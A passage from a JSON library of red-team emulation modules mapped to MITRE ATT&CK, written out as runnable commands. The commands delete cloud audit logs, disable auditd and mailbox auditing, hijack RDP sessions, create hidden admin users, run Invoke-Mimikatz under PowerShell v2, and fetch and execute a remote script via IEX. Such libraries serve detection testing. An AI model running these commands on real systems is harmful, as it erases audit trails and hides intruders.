        "command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region}\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cloudwatch_log_group_name",
          "description": "Name of the cloudWatch log group",
          "type": "string",
          "default_value": "test-logs"
        },
        {
          "name": "cloudwatch_log_stream_name",
          "description": "Name of the cloudWatch log stream",
          "type": "string",
          "default_value": "20150601"
        },
        {
          "name": "region",
          "description": "Name of the region",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "33ca84bc-4259-4943-bd36-4655dc420932",
      "module_name": "AWS CloudWatch Log Stream Deletes"
    },
    {
      "index": 1628,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $true\n",
        "elevation_required": false,
        "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $false\nDisconnect-ExchangeOnline -Confirm:$false\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "office-365 username",
          "type": "string",
          "default_value": "o365_user_test"
        },
        {
          "name": "password",
          "description": "office-365 password",
          "type": "string",
          "default_value": "o365_password_test"
        },
        {
          "name": "target_email",
          "description": "office-365 target_email",
          "type": "string",
          "default_value": "o365_email_test"
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed\n",
          "check_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
        }
      ],
      "rx_module_id": "c9a2f6fe-7197-488c-af6d-10c782121ca6",
      "module_name": "Office 365 - Set Audit Bypass For a Mailbox"
    },
    {
      "index": 1629,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis RAGLOX attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n",
      "execution": {
        "platforms": [
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud config set project #{project-id}\ngcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "project-id",
          "description": "ID of the GCP Project you to execute the command against.",
          "type": "string",
          "default_value": "raglox-project-1"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires gcloud\n",
          "check_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Please Install Google Cloud SDK before running this RAGLOX module : https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "Check if user is logged in \n",
          "check_command": "gcloud config get-value account\n",
          "install_command": "gcloud auth login --no-launch-browser\n"
        }
      ],
      "rx_module_id": "d56152ec-01d9-42a2-877c-aac1f6ebe8e6",
      "module_name": "GCP - Delete Activity Event Log"
    },
    {
      "index": 1630,
      "technique_id": "T1562.009",
      "technique_name": "Impair Defenses: Safe Boot Mode",
      "description": "Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "bcdedit /set safeboot network",
        "elevation_required": true,
        "cleanup_command": "bcdedit /deletevalue {current} safeboot"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2a78362e-b79a-4482-8e24-be397bce4d85",
      "module_name": "Safe Mode Boot"
    },
    {
      "index": 1631,
      "technique_id": "T1562.010",
      "technique_name": "Impair Defenses: Downgrade Attack",
      "description": "An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "powershell",
        "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
          "check_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
          "install_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
        }
      ],
      "rx_module_id": "062f92c9-28b1-4391-a5f8-9d8ca6852091",
      "module_name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI"
    },
    {
      "index": 1632,
      "technique_id": "T1562.010",
      "technique_name": "Impair Defenses: Downgrade Attack",
      "description": "An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to script with commands to change acceptance level",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1562.010\\src\\esx_community_supported.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "14d55b96-b2f5-428d-8fed-49dc4d9dd616",
      "module_name": "ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI"
    },
    {
      "index": 1633,
      "technique_id": "T1562.010",
      "technique_name": "Impair Defenses: Downgrade Attack",
      "description": "Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the raglox will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "PowerShell -version 2 -command '#{v2_command}'",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "v2_command",
          "description": "Specify the command to execute with Version 2",
          "type": "string",
          "default_value": "Invoke-Mimikatz"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if Version 2 is installed.",
          "check_command": "$v2_installed = PowerShell -version 2 -command '$PSVersionTable.PSVersion.Major'\nif (-not $v2_installed) {exit 1} else {exit 0}\n",
          "install_command": "echo \"Manually install PowerShell Version 2\"\n"
        }
      ],
      "rx_module_id": "47c96489-2f55-4774-a6df-39faff428f6f",
      "module_name": "PowerShell Version 2 Downgrade"
    },
    {
      "index": 1634,
      "technique_id": "T1562.012",
      "technique_name": "Impair Defenses: Disable or Modify Linux Audit System",
      "description": "Using 'auditctl -D' deletes all existing audit rules, resulting in the loss of previously configured monitoring settings and the audit trail. This action reduces visibility into system activities, potentially leading to compliance concerns and hampering security monitoring efforts. Additionally, it poses a risk of covering unauthorized activities by erasing evidence from audit logs.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "auditctl -D\n",
        "elevation_required": true,
        "cleanup_command": "service auditd restart\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if auditd is installed.\n",
          "check_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
          "install_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
        }
      ],
      "rx_module_id": "33a29ab1-cabb-407f-9448-269041bf2856",
      "module_name": "Delete all auditd rules using auditctl"
    },
    {
      "index": 1635,
      "technique_id": "T1562.012",
      "technique_name": "Impair Defenses: Disable or Modify Linux Audit System",
      "description": "The command `auditctl -e 0` disables the audit system. By setting the parameter to `0`, auditing is deactivated, halting the monitoring and recording of security-related events. This action stops the generation of audit logs, ceasing the collection of data regarding system activities. Disabling auditing may be done for various reasons, such as troubleshooting, performance optimization, or temporarily suspending auditing requirements, but it reduces visibility into system events and can impact security monitoring and compliance efforts.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "auditctl -e 0\n",
        "elevation_required": true,
        "cleanup_command": "auditctl -e 1\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if auditd is installed.\n",
          "check_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
          "install_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
        }
      ],
      "rx_module_id": "7906f0a6-b527-46ee-9026-6e81a9184e08",
      "module_name": "Disable auditd using auditctl"
    },
    {
      "index": 1636,
      "technique_id": "T1563.002",
      "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
      "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe delete sesshijack >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "Session_ID",
          "description": "The ID of the session to which you want to connect",
          "type": "string",
          "default_value": "1337"
        },
        {
          "name": "Destination_ID",
          "description": "Connect the session of another user to a different session",
          "type": "string",
          "default_value": "rdp-tcp#55"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a37ac520-b911-458e-8aed-c5f1576d9f46",
      "module_name": "RDP hijacking"
    },
    {
      "index": 1637,
      "technique_id": "T1564",
      "technique_name": "Hide Artifacts",
      "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$macro = [System.IO.File]::ReadAllText(\"PathToRagloxModulesFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToRagloxModulesFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a",
      "module_name": "Extract binary files via VBA"
    },
    {
      "index": 1638,
      "technique_id": "T1564",
      "technique_name": "Hide Artifacts",
      "description": "Creating a user with a username containing \"$\"",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user $ RAGLOX123! /add /active:yes",
        "elevation_required": true,
        "cleanup_command": "net user $ /DELETE 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2ec63cc2-4975-41a6-bf09-dffdfb610778",
      "module_name": "Create a Hidden User Called \"$\""
    },
    {
      "index": 1639,
      "technique_id": "T1564",
      "technique_name": "Hide Artifacts",
      "description": "Creating a user with a username containing with a space on the end",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-LocalUser -Name \"Administrator \" -NoPassword",
        "elevation_required": true,
        "cleanup_command": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5bb20389-39a5-4e99-9264-aeb92a55a85c",
      "module_name": "Create an \"Administrator \" user (with a space on the end)"
    },
    {
      "index": 1640,
      "technique_id": "T1564",
      "technique_name": "Hide Artifacts",
      "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc sdset #{service_name} \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n",
        "elevation_required": true,
        "cleanup_command": "sc sdset #{service_name} \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\nsc.exe delete #{service_name}\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of service to create",
          "type": "string",
          "default_value": "RAGLOXService"
        },
        {
          "name": "executable_command",
          "description": "Command to execute as a service",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "333c7de0-6fbe-42aa-ac2b-c7e40b18246a",
      "module_name": "Create and Hide a Service with sc.exe"
    },
    {
      "index": 1641,
      "technique_id": "T1564",
      "technique_name": "Hide Artifacts",
      "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c \"#{nircmd_location}\" #{command_to_execute}\n",
        "elevation_required": false,
        "cleanup_command": "cmd /c \"#{nircmd_location}\" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null\n"
      },
      "variables": [
        {
          "name": "nircmd_location",
          "description": "Location of nircmd executable",
          "type": "Path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\nircmd.exe"
        },
        {
          "name": "command_to_execute",
          "description": "Command for nircmd to execute",
          "type": "Path",
          "default_value": "win child class \"Shell_TrayWnd\" hide class \"TrayClockWClass\""
        },
        {
          "name": "cleanup_command_to_execute",
          "description": "Cleanup command to undo the arbitrary command ran by nircmd",
          "type": "Path",
          "default_value": "win child class \"Shell_TrayWnd\" show class \"TrayClockWClass\""
        }
      ],
      "prerequisites": [
        {
          "description": "The Nircmd executable must exist at (#{nircmd_location})\n",
          "check_command": "if (Test-Path \"#{nircmd_location}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://www.nirsoft.net/utils/nircmd-x64.zip\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nircmd.zip\" \nexpand-archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nircmd.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\"\n"
        }
      ],
      "rx_module_id": "2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be",
      "module_name": "Command Execution with NirCmd"
    },
    {
      "index": 1642,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Creates a hidden file inside a hidden directory\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "61a782e5-9a19-40b5-8ba4-69a4b9f3d7be",
      "module_name": "Create a hidden file in a hidden directory"
    },
    {
      "index": 1643,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Hide a file on MacOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cddb9098-3b47-4e01-9d3b-6f5f323288a9",
      "module_name": "Mac Hidden file"
    },
    {
      "index": 1644,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "attrib.exe +s #{file_to_modify}\n",
        "elevation_required": true,
        "cleanup_command": "del /A:S #{file_to_modify} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "File to modify using Attrib command",
          "type": "string",
          "default_value": "%temp%\\T1564.001.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist on disk at specified location (#{file_to_modify})\n",
          "check_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"
        }
      ],
      "rx_module_id": "f70974c8-c094-4574-b542-2c545af95a32",
      "module_name": "Create Windows System File with Attrib"
    },
    {
      "index": 1645,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "attrib.exe +h #{file_to_modify}\n",
        "elevation_required": true,
        "cleanup_command": "del /A:H #{file_to_modify} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "File to modify using Attrib command",
          "type": "string",
          "default_value": "%temp%\\T1564.001.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist on disk at specified location (#{file_to_modify})\n",
          "check_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"
        }
      ],
      "rx_module_id": "dadb792e-4358-4d8d-9207-b771faa0daa5",
      "module_name": "Create Windows Hidden File with Attrib"
    },
    {
      "index": 1646,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Requires Apple Dev Tools\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "setfile -a V #{filename}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "filename",
          "description": "path of file to hide",
          "type": "path",
          "default_value": "/tmp/evil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3b7015f2-3144-4205-b799-b05580621379",
      "module_name": "Hidden files"
    },
    {
      "index": 1647,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Hide a directory on MacOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n",
        "elevation_required": false,
        "cleanup_command": "rm /var/tmp/T1564.001_mac.txt\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b115ecaf-3b24-4ed2-aefe-2fcb9db913d3",
      "module_name": "Hide a Directory"
    },
    {
      "index": 1648,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Show all hidden files on MacOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "defaults write com.apple.finder AppleShowAllFiles YES\n",
        "elevation_required": false,
        "cleanup_command": "defaults write com.apple.finder AppleShowAllFiles NO\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9a1ec7da-b892-449f-ad68-67066d04380c",
      "module_name": "Show all hidden files"
    },
    {
      "index": 1649,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f650456b-bd49-4bc1-ae9d-271b5b9581e7",
      "module_name": "Hide Files Through Registry"
    },
    {
      "index": 1650,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Creates a file and marks it as hidden through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"H\" Hidden.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$file = Get-Item $env:temp\\T1564.001-9.txt -Force\n$file.attributes='Hidden'\n",
        "elevation_required": true,
        "cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n"
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "File to modify",
          "type": "string",
          "default_value": "%temp%\\T1564.001-9.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist on disk at specified location (#{file_to_modify})\n",
          "check_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "echo system_Attrib_T1564.001-9 >> #{file_to_modify}\n"
        }
      ],
      "rx_module_id": "7f66d539-4fbe-4cfa-9a56-4a2bf660c58a",
      "module_name": "Create Windows Hidden File with powershell"
    },
    {
      "index": 1651,
      "technique_id": "T1564.001",
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "description": "Creates a file and marks it as System through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"S\" System.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n",
        "elevation_required": true,
        "cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n"
      },
      "variables": [
        {
          "name": "file_to_modify",
          "description": "File to modify",
          "type": "string",
          "default_value": "%temp%\\T1564.001-10.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist on disk at specified location (#{file_to_modify})\n",
          "check_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "echo system_Attrib_T1564.001-10 >> #{file_to_modify}\n"
        }
      ],
      "rx_module_id": "d380c318-0b34-45cb-9dad-828c11891e43",
      "module_name": "Create Windows System File with powershell"
    },
    {
      "index": 1652,
      "technique_id": "T1564.002",
      "technique_name": "Hide Artifacts: Hidden Users",
      "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n",
        "elevation_required": true,
        "cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n"
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username to add",
          "type": "string",
          "default_value": "APT"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4238a7f0-a980-4fff-98a2-dfc0a363d507",
      "module_name": "Create Hidden User using UniqueID < 500"
    },
    {
      "index": 1653,
      "technique_id": "T1564.002",
      "technique_name": "Hide Artifacts: Hidden Users",
      "description": "Add a hidden user on macOS using IsHidden optoin\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo dscl . -create /Users/#{user_name} IsHidden 1\n",
        "elevation_required": true,
        "cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n"
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username to add",
          "type": "string",
          "default_value": "APT"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "de87ed7b-52c3-43fd-9554-730f695e7f31",
      "module_name": "Create Hidden User using IsHidden option"
    },
    {
      "index": 1654,
      "technique_id": "T1564.002",
      "technique_name": "Hide Artifacts: Hidden Users",
